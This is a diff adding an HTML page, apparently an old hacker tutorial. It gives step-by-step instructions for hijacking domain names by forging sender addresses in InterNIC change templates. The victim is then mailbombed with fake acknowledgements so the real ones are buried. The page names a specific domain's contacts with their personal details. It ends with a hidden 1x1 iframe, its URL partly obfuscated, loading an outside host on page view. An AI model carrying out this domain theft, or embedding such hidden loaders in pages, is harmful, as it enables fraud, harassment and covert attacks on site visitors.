@@ -1,0 +1,566 @@
+<html>
+<head>
+<title>A Flaw in InterNIC Authentication Scheme</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr> 
+    <td width="693"> 
+      <pre>
+                        :::::::::   ::::::::  :::::::::  :::::::::: 
+                        :+:    :+: :+:    :+: :+:    :+: :+:        
+                        +:+    +:+ +:+        +:+    +:+ +:+        
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                        +#+    +#+        +#+ +#+    +#+ +#+        
+                        #+#    #+# #+#    #+# #+#    #+# #+#        
+                        #########   ########  ###    ### ###  
+                         
+              	             <a href="%20http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I     <b>A Flaw in InterNIC</b>      I   Written by:     /
+    >                     I    <b>Authentication Scheme</b>    I                  < 
+   /      <a href="mailto:black_mesa@gmx.de">Martin L.</a>       I_____________________________I   <a href="mailto:lucifermirza@hotmail.com">Lucifer Mirza</a>   \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+<br>
+<br>
+<br>
+<font size="4"><b>Disclaimer:</b></font><br>
+<br>
+This sole purpose of the information contained in this advisory is to point out 
+the flaws in InterNIC's domain name handling system and is intented for education. 
+Any abuse of the information in whole or in part is NOT my responsibility nor 
+do I encourage illegal activities. 
+<p>The below mentioned technique involves a planned step by step way of stealing 
+  different sorts of com/net/org/gov/mil domain names.<br>
+  <br>
+  <font size="4"><b>Tools:</b></font><br>
+</p>
+<ul>
+  <li> anonymous remailer or mail bomber which could spoof email adresses (I used 
+    Kaboom). </li>
+  <li>access to internet and mainly networksolutions.com website.</li>
+  <li>Social Engineering skills for timing the emails.</li>
+  <li>A fake email address at hotmail.com or any other free service.</li>
+</ul>
+<p><br>
+  <br>
+  <font size="4"><b>Intructions:</b></font><br>
+  <br>
+  As an example for this advisory, I will take the domain name wi2000.org. Go 
+  to <a href="http://networksolutions.com" target="_blank">networksolutions.com</a> 
+  and click on the link that says 'Who Is.' Now enter the domain name (wi2000.org 
+  in this case) in the search field and click on the 'Search' button. This would 
+  show you the WhoIs information as shown below<br>
+</p>
+<hr width="75%" align="center">
+<br>
+Registrant:<br>
+WI2000 (WI24-DOM)<br>
+Blixered 1<br>
+Goteborg, Lila Edet 46394<br>
+SE
+<p> Domain Name: WI2000.ORG</p>
+<p> <b>Administrative Contact:</b><br>
+  MICKE, ANDERSSON (AMM367) HACKEDINDUSTRIES@HOTMAIL.COM<br>
+  545326-3445 (FAX) 545326-3445<br>
+  <b>Technical Contact, Zone Contact:</b><br>
+  Jason, Berresford (BJE41) jasonb@MOUNTAINCABLE.NET<br>
+  1-(905)-765-5212<br>
+  <b>Billing Contact:</b><br>
+  MICKE, ANDERSSON (AMM367) HACKEDINDUSTRIES@HOTMAIL.COM<br>
+  545326-3445 (FAX) 545326-3445</p>
+<p> Record last updated on 22-Jan-2000.<br>
+  Record created on 19-Dec-1999.<br>
+  Database last updated on 3-Feb-2000 14:29:53 EST.</p>
+<p> Domain servers in listed order:</p>
+<p> NS1.CAN-HOST.COM 24.215.1.6<br>
+  NS2.MOUNTAINCABLE.NET 24.215.0.12<br>
+</p>
+<hr width="75%" align="center">
+<p>Now you have two choices here:</p>
+<p><b>-01&gt;</b> Either you could take full control of the domain by changing 
+  the Administrator's handle information.</p>
+<p> OR</p>
+<p><b>-02&gt;</b> You could simply point the domain to another host and let it 
+  recover in time by itself.</p>
+<p>The first approach is very aggressive and could be hazardous if you are going 
+  for gov or mil domain names so I recommend second approach for gov and mil domains.<br>
+  <b><font size="4"><br>
+  Intiating the First Attack:</font></b><br>
+  <br>
+  Let me first explain the InterNIC authentication system in case most of you 
+  would be the readers who do not have their own domain names. The problem with 
+  InterNIC authentication is that they do NOT send a confirmation email if the 
+  request is sent from the same email as the person owning the contact or the 
+  domain name itself! Therefore, utilizing this flaw one could spoof anyone's 
+  email address and change any domain name's information. Although, a confirmation 
+  is required from the person to whom the domain is about to be transferred; and 
+  that shouldn't be too hard as it would your own email address ;-)</p>
+<p>Here's a step by step procedure:</p>
+<ul>
+  <li>Go to <a href="http://www.networksolutions.com/" target="_blank">http://www.networksolutions.com/</a></li>
+  <li>Click on the link that says 'Make Changes.'</li>
+  <li>Enter the domain name wi2000.org</li>
+  <li>You should be presented with 2 blue buttons</li>
+  <li>Click on the one that says *Expert*</li>
+  <li>Next screen would have a heading 'Select the form that meets your needs'</li>
+  <li>Click on the link that say 'Contact Form'</li>
+  <li>Next you should see a form with 2 fields.</li>
+  <li>In the first field enter the admin's handle (wi2000.org admin is AMM367)</li>
+  <li>In the next field enter his/her email address (in this case it's HACKEDINDUSTRIES@HOTMAIL.COM)</li>
+  <li>Change the option to 'Modify.'</li>
+  <li>Now 'Proceed to Contact Information.'</li>
+  <li>Select the MAIL-FROM option and click the 'Go on to Contact Data Information.'</li>
+  <li>Now you should see all the information about the admin contact of domain 
+    name!</li>
+  <li>In the E-mail address field change the email to your own fake email. (I 
+    changed it to dd@doom.com)</li>
+  <li>Now 'Proceed to Set Authorization Scheme.'</li>
+  <li>Again choose MAIL-FROM and enter the email address of the admin (HACKEDINDUSTRIES@HOTMAIL.COM)</li>
+  <li>Leave the bottom option to 'No' and 'Generate Contact Form.'</li>
+  <li>Now you should see a template with all the information. Similar to this:</li>
+  <br>
+</ul>
+    <p>******************* Please DO NOT REMOVE Version Number **********************</p>
+<p>Contact Version Number: 1.0</p>
+<p>**************** Please see attached detailed instructions *******************</p>
+<table width="75%" border="0" cellpadding="2" cellspacing="2">
+  <tr>
+    <td>&nbsp;</td>
+    <td>Authorization</td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td>0a.</td>
+    <td>(N)ew (M)odify (D)elete.:</td>
+    <td>Modify</td>
+  </tr>
+  <tr>
+    <td>0b.</td>
+    <td>Auth Scheme.............:</td>
+    <td><br>
+      MAIL-FROM</td>
+  </tr>
+  <tr>
+    <td>0c.</td>
+    <td>Auth Info...............:</td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+    <td>&nbsp;</td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+    <td>Contact Information</td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td>1a.</td>
+    <td>NIC Handle..............:</td>
+    <td>AMM367</td>
+  </tr>
+  <tr>
+    <td>1b.</td>
+    <td>(I)ndividual (R)ole.....:</td>
+    <td>Individual</td>
+  </tr>
+  <tr>
+    <td>1c.</td>
+    <td>Name....................:</td>
+    <td>MICKE, ANDERSSON</td>
+  </tr>
+  <tr>
+    <td>1d.</td>
+    <td>Organization Name.......:</td>
+    <td>WI2000</td>
+  </tr>
+  <tr>
+    <td>1e.</td>
+    <td>Street Address..........: </td>
+    <td>BLIXERED 1</td>
+  </tr>
+  <tr>
+    <td>1f.</td>
+    <td>City....................: </td>
+    <td>GOTEBORG</td>
+  </tr>
+  <tr>
+    <td>1g.</td>
+    <td>State...................:</td>
+    <td>LILLA EDET </td>
+  </tr>
+  <tr>
+    <td>1h.</td>
+    <td>Postal Code.............:</td>
+    <td>46394</td>
+  </tr>
+  <tr>
+    <td>1i.</td>
+    <td>Country.................:</td>
+    <td>SE</td>
+  </tr>
+  <tr>
+    <td>1j.</td>
+    <td>Phone Number............:</td>
+    <td>545326-3445 </td>
+  </tr>
+  <tr>
+    <td>1k.</td>
+    <td>Fax Number..............:</td>
+    <td>545326-3445</td>
+  </tr>
+  <tr>
+    <td>1l. </td>
+    <td>E-Mailbox...............: </td>
+    <td>dd@doom.com</td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+    <td>&nbsp;</td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+    <td>Notify Information</td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td>2a. </td>
+    <td>Notify Updates..........: </td>
+    <td>AFTER-UPDATE</td>
+  </tr>
+  <tr>
+    <td>2b.</td>
+    <td>Notify Use..............: </td>
+    <td>AFTER-USE</td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+    <td>&nbsp;</td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+    <td>Authentication </td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td>3a. </td>
+    <td>Auth Scheme.............: </td>
+    <td>MAIL-FROM</td>
+  </tr>
+  <tr>
+    <td>3b.</td>
+    <td>Auth Info...............: </td>
+    <td>HACKEDINDUSTRIES@HOTMAIL.COM</td>
+  </tr>
+  <tr>
+    <td>3c.</td>
+    <td>Public (Y/N)............:</td>
+    <td>NO</td>
+  </tr>
+</table>
+<hr width="75%" align="center">
+<br>
+<br>
+<b>NOTE:</b> Do NOT press the button at the bottom that says 'Mail this contact 
+form to me!'<br>
+<br>
+Copy and paste this message into your anonymour remailer or mailbomber and you 
+are ready to go; but WAIT! It's not that easy, now comes the HARD part! When you 
+mail this message to hostmaster@networksolutions.com a message similar to the 
+following would be sent to the admin email address:
+<p><br>
+  Subject: [NIC-000128.4r50] Your Mail</p>
+<hr width="75%" align="center">
+<p><br>
+  This is an automatic reply to acknowledge that your message has been received 
+  by hostmaster@networksolutions.com. This acknowledgement is &quot;NOT&quot; 
+  a confirmation that your request has been processed. You will be notified when 
+  it has been completed.</p>
+<p>If you should have need to correspond with us regarding this request, please 
+  include the tracking number [NIC-000128.4r50] in the subject. The easiest way 
+  to do this is simply to reply to this message.</p>
+<p>If you have not already done so, please come and visit our site via www browser 
+  or ftp and pick-up the latest domain template or review the Domain Name Registration 
+  Service Agreement at the URL's:</p>
+<p> Domain Name Registration Service Agreement <a href="http://www.networksolutions.com/legal/service-agreement.html" target="_blank">http://www.networksolutions.com/legal/service-agreement.html</a> 
+  Domain Name Registration Template <a href="ftp://www.networksolutions.com/templates/domain-template.txt" target="_blank">ftp://www.networksolutions.com/templates/domain-template.txt</a></p>
+<p>Regards,<br>
+  Network Solutions Registration Services</p>
+<p>***********************************************</p>
+<p>***********************************************<br>
+  <b>IMPORTANT INFORMATION</b><br>
+  ***********************************************<br>
+  On January 15, 2000, Network Solutions introduced Service Agreement, Version 
+  6.0. All versions of the Service Agreement template will continue to be accepted 
+  and processed until January 31, 2000. On and after February 1, 2000, please 
+  use the Network Solutions Service Agreement, Version 6.0 template located at 
+  <a href="ftp://www.networksolutions.com/templates/domain-template.txt" target="_blank">ftp://www.networksolutions.com/templates/domain-template.txt</a> 
+  for all template requests.</p>
+<p>The terms and conditions of the Service Agreement are available on our Web 
+  site at <a href="http://www.networksolutions.com/legal/service-agreement.html" target="_blank">http://www.networksolutions.com/legal/service-agreement.html</a>.<br>
+  ************************************************</p>
+<p>The zone files, which make the Internet work, are normally updated twice daily, 
+  7 days a week at 5:00 AM and 5:00 PM U.S. Eastern Standard Time. Requests that 
+  are completed before these times will be included in that 12-hour zone file 
+  update and will normally begin to take effect within 5-6 hours.</p>
+<p>Should you wish to modify or delete an existing domain name registration, you 
+  can do so online, using our Service Agreement. You can change the registrant&#146;s 
+  address, replace a contact/agent with a different contact/agent, or change primary 
+  and/or secondary name server information.</p>
+<p>To update information about an existing contact, such as postal address, e-mail 
+  address or telephone number, complete and submit the Contact Form to hostmaster@internic.net. 
+  This form is available on our Web site at <a href="http://www.networksolutions.com" target="_blank">www.networksolutions.com</a></p>
+<p>To register or update information about a name server, complete and submit 
+  the Host Form to hostmaster@internic.net. This form is also available on our 
+  Web site.</p>
+<p>Network Solutions Registration Services e-mail: <a href="mailto:help@networksolutions.com">help@networksolutions.com</a><br>
+  _______________________________________________________________________</p>
+<p><br>
+  You should now be thinking that this message could get you in trouble but there 
+  is a way of getting rid of this trouble. Here you'll use your mailbomber to 
+  mailbomb the guy with 20-30 similar messages if you want your attack to be successful. 
+  The person would see 35 messages from the same address and therefore would delete 
+  all of them and you'd probably be safe. If he 'would' email someone then he 
+  would probably reply to the wrong tracking number. In the above case, the tracking 
+  number is [NIC-000128.4r50]. OK, here another hard part. You have to open your 
+  notepad and generate similar numbers actually come up with them. You should 
+  NEVER mailbomb the person with the same tracking number. What I mean is that 
+  you should never send more than one emails to him from [NIC-000128.4r50] in 
+  the next email, change the [NIC-000128.4r50] to [NIC-000127.5089] or something 
+  different. Here is a list of some numbers that I generated just to give you 
+  a good idea of how the scheme works.</p>
+<p>[NIC-000127.5089]<br>
+  [NIC-000128.4rg7]<br>
+  [NIC-000128.523f]<br>
+  [NIC-000127.53d0]<br>
+  [NIC-000129.r609]<br>
+  [NIC-000128.3f6y]<br>
+  [NIC-000128.5d8t]<br>
+  [NIC-000127.r509]<br>
+  [NIC-000128.4r30]<br>
+  [NIC-000127.d307]<br>
+  <br>
+</p>
+<table width="100%" border="0" cellspacing="2" cellpadding="2">
+  <tr>
+    <td>NOTE:</td>
+    <td>Remember to change the number at both places. In the subject as well as 
+      the email body!</td>
+  </tr>
+</table>
+<p>In the case of wi2000.org you will send the email messages to HACKEDINDUSTRIES@HOTMAIL.COM 
+  from hostmaster@internic.net. The message subject and body are already described 
+  above.</p>
+<p>Stop after you have mailed him/her 10-15 messages! Now it's time to email hostmaster@networksolutions.com 
+  with our fake email as HACKEDINDUSTRIES@HOTMAIL.COM So again, in this case the 
+  message will be sent to hostmaster@networksolutions.com from HACKEDINDUSTRIES@HOTMAIL.COM 
+  with the following template that we created above:<br>
+  ______________________________________________________________________________<br>
+  ******************* Please DO NOT REMOVE Version Number **********************</p>
+<p>Contact Version Number: 1.0</p>
+<p>**************** Please see attached detailed instructions *******************</p>
+<p>Authorization <br>
+  0a. (N)ew (M)odify (D)elete.: Modify<br>
+  0b. Auth Scheme.............: MAIL-FROM<br>
+  0c. Auth Info...............: </p>
+<p>Contact Information<br>
+  1a. NIC Handle..............: AMM367<br>
+  1b. (I)ndividual (R)ole.....: Individual<br>
+  1c. Name....................: MICKE, ANDERSSON<br>
+  1d. Organization Name.......: WI2000<br>
+  1e. Street Address..........: BLIXERED 1<br>
+  1f. City....................: GOTEBORG<br>
+  1g. State...................: LILLA EDET <br>
+  1h. Postal Code.............: 46394<br>
+  1i. Country.................: SE<br>
+  1j. Phone Number............: 545326-3445 <br>
+  1k. Fax Number..............: 545326-3445<br>
+  1l. E-Mailbox...............: dd@doom.com</p>
+<p>Notify Information<br>
+  2a. Notify Updates..........: AFTER-UPDATE<br>
+  2b. Notify Use..............: AFTER-USE</p>
+<p>Authentication <br>
+  3a. Auth Scheme.............: MAIL-FROM<br>
+  3b. Auth Info...............: HACKEDINDUSTRIES@HOTMAIL.COM<br>
+  3c. Public (Y/N)............: NO<br>
+  ________________________________________________________________________________<br>
+  _____<br>
+  NOTE: Do NOT put anything in the Subject!<br>
+  -----<br>
+  Just send one email! Do NOT bomb hostmaster@networksolutions.com with more than 
+  one emails!! That's pretty much it. Now continue to bomb HACKEDINDUSTRIES@HOTMAIL.COM, 
+  changing the tracking number everytime until your 30-35 tracking numbers are 
+  used up!</p>
+<p>Now all you gotta do it WAIT. After 24 hours you could go and change the domain 
+  information and no one would be there to stop you because now you are the admin 
+  of the domain name!<br>
+  _____<br>
+  NOTE: This attack will only work on domains that have an admin contact different<br>
+  ----- from their technical contact!<br>
+  ____________________________<br>
+  Intiating the Second Attack:<br>
+  ----------------------------<br>
+  This attack will be successful even if the technical and admin contact are the<br>
+  same but the admin of the contact needs to be kind of stupid to disregard<br>
+  emails from interNIC as he is also the technical contact; but this method should<br>
+  work as it has worked for me.<br>
+  The procedure is basically the same apart from the fact that this time:<br>
+  - Go to http://www.networksolutions.com/<br>
+  - Click on the link that says 'Make Changes.'<br>
+  - Enter the domain name wi2000.org<br>
+  - You should be presented with 2 blue buttons<br>
+  - Click on the one that says *Expert*<br>
+  - Next screen would have a heading 'Select the form that meets your needs'<br>
+  - Click on the link that say 'Service Agreement.'<br>
+  - Now when it asks for email address, enter your own.<br>
+  - Now you should see many fields, don't panic!<br>
+  - Go to the technical contact and change the handle to freeservers, hypermart 
+  e.t.c.<br>
+  - Now come to 'Nameserver Information.'<br>
+  - Change the nameservers to hypermart or freeserver nameservers.<br>
+  - If there's anything in the 'Optional Information' after that then <br>
+  simply delete them.<br>
+  - Click on the button 'Submit this form for processing.'<br>
+  - You are done, the form will be emailed to your email address.<br>
+  - When the form arrives in your email, then simply take this part:<br>
+  ___________________________________________________________________________________<br>
+  **** PLEASE DO NOT REMOVE Version Number or any of the information below<br>
+  when submitting this template to hostmaster@networksolutions.com. *****</p>
+<p>Domain Version Number: 5.0</p>
+<p>********* Email completed agreement to hostmaster@networksolutions.com *********</p>
+<p><br>
+  AGREEMENT TO BE BOUND. By applying for a Network Solutions' service(s)<br>
+  through our online application process or by applying for and registering a<br>
+  domain name as part of our e-mail template application process or by using<br>
+  the service(s) provided by Network Solutions under the Service Agreement,<br>
+  Version 5.0, you acknowledge that you have read and agree to be bound by all<br>
+  terms and conditions of this Agreement and any pertinent rules or policies<br>
+  that are or may be published by Network Solutions.</p>
+<p>Please find the Network Solutions Service Agreement, Version 5.0 located at<br>
+  the URL &lt;a href=&quot;http://www.networksolutions.com/legal/service-agreement.html&quot;&gt;<br>
+  http://www.networksolutions.com/legal/service-agreement.html&lt;/a&gt;.</p>
+<p><br>
+  [ URL &lt;a<br>
+  href=&quot;ftp://www.networksolutions.com&quot;&gt;ftp://www.networksolutions.com&lt;/a&gt; 
+  ]<br>
+  [11/99]</p>
+<p>Authorization<br>
+  0a. (N)ew (M)odify (D)elete.........: M Name Registration<br>
+  0b. Auth Scheme.....................: MAIL-FROM<br>
+  0c. Auth Info.......................:</p>
+<p>1. Comments........................:</p>
+<p>2. Complete Domain Name............: wi2000.org</p>
+<p>Organization Using Domain Name<br>
+  3a. Organization Name................: WI2000<br>
+  3b. Street Address..................: Blixered 1<br>
+  3c. City............................: Goteborg<br>
+  3d. State...........................: Lila Edet<br>
+  3e. Postal Code.....................: 46394<br>
+  3f. Country.........................: SE</p>
+<p>Administrative Contact<br>
+  4a. NIC Handle (if known)...........: AMM367<br>
+  4b. (I)ndividual (R)ole?............: Individual<br>
+  4c. Name (Last, First)..............:<br>
+  4d. Organization Name...............:<br>
+  4e. Street Address..................:<br>
+  4f. City............................:<br>
+  4g. State...........................:<br>
+  4h. Postal Code.....................:<br>
+  4i. Country.........................:<br>
+  4j. Phone Number....................:<br>
+  4k. Fax Number......................:<br>
+  4l. E-Mailbox.......................:</p>
+<p>Technical Contact<br>
+  5a. NIC Handle (if known)...........: BJE41<br>
+  5b. (I)ndividual (R)ole?............: Individual<br>
+  5c. Name(Last, First)...............:<br>
+  5d. Organization Name...............:<br>
+  5e. Street Address..................:<br>
+  5f. City............................:<br>
+  5g. State...........................:<br>
+  5h. Postal Code.....................:<br>
+  5i. Country.........................:<br>
+  5j. Phone Number....................:<br>
+  5k. Fax Number......................:<br>
+  5l. E-Mailbox.......................:</p>
+<p>Billing Contact<br>
+  6a. NIC Handle (if known)...........: AMM367<br>
+  6b. (I)ndividual (R)ole?............: Individual<br>
+  6c. Name (Last, First)..............:<br>
+  6d. Organization Name...............:<br>
+  6e. Street Address..................:<br>
+  6f. City............................:<br>
+  6g. State...........................:<br>
+  6h. Postal Code.....................:<br>
+  6i. Country.........................:<br>
+  6j. Phone Number....................:<br>
+  6k. Fax Number......................:<br>
+  6l. E-Mailbox.......................:</p>
+<p>Prime Name Server<br>
+  7a. Primary Server Hostname.........: NS1.CAN-HOST.COM<br>
+  7b. Primary Server Netaddress.......: 24.215.1.6</p>
+<p>Secondary Name Server(s)<br>
+  8a. Secondary Server Hostname.......: NS2.MOUNTAINCABLE.NET<br>
+  8b. Secondary Server Netaddress.....: 24.215.0.12</p>
+<p><br>
+  END OF AGREEMENT</p>
+<p><br>
+  For instructions, please refer to:<br>
+  &quot;http://www.networksolutions.com/help/inst-mod.html&quot;<br>
+  ____________________________________________________________________________________</p>
+<p> - Now launch your anonymous remailer or mailbomber.<br>
+  - From: the domain admin (HACKEDINDUSTRIES@HOTMAIL.COM in this case).<br>
+  - To: hostmaster@networksolutions.com<br>
+  - Subject: (do not enter any subject, leave the field blank!)<br>
+  - Body: the template you created above.<br>
+  - You are ready to go but before you send this email to InterNIC,<br>
+  remember to bomb HACKEDINDUSTRIES@HOTMAIL.COM with similar emails<br>
+  but different tracking numbers as we did in the first procedure.<br>
+  - After sending 10-20 emails, send the above template to InterNIC.<br>
+  - Continue bombing your 40 messages. Remember to generate 40-50<br>
+  tracking numbers.<br>
+  - This is basically it.<br>
+  - The domain would be transferred to freeservers or hypermart<br>
+  and then you could simply activate it from there on your own email<br>
+  address. Remember to use a fake email.<br>
+  ________________________<br>
+  Nameservers and Handles:<br>
+  ------------------------<br>
+  Freeservers Technical Handle: FS4394<br>
+  Primary Nameserver: NS3.FREESERVERS.COM<br>
+  Primary Nameserver IP Address: 209.210.67.153<br>
+  Secondary Nameserver: NS4.FREESERVERS.COM<br>
+  Secondary Nameserver IP Address: 209.210.67.154</p>
+<p>Hypermart Technical Handle: DA3706-ORG<br>
+  Primary Nameserver: NS1.HYPERMART.NET<br>
+  Primary Nameserver IP Address: 206.253.222.65<br>
+  Secondary Nameserver: NS2.HYPERMART.NET<br>
+  Secondary Nameserver IP Address: 206.253.222.66</p>
+<p>_______________<br>
+  Possible Fixes:<br>
+  ---------------<br>
+  As you have seen, InterNIC does not use the tracking number system too<br>
+  efficiently. Possible fixes would certainly be a confirmation email to<br>
+  the admin contact 'with' a tracking number. NOT the email saying 'Your request 
+  <br>
+  is being processed' but a confirmation email which would ask, 'Do you agree 
+  <br>
+  with this request?' even if it has been sent from the same email address as 
+  admin's!<br>
+  Tracking numbers could be easily generated and the attacks I have mentioned<br>
+  above aren't too hard for a script kiddie with a canned bomber.</p>
+<p></p>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
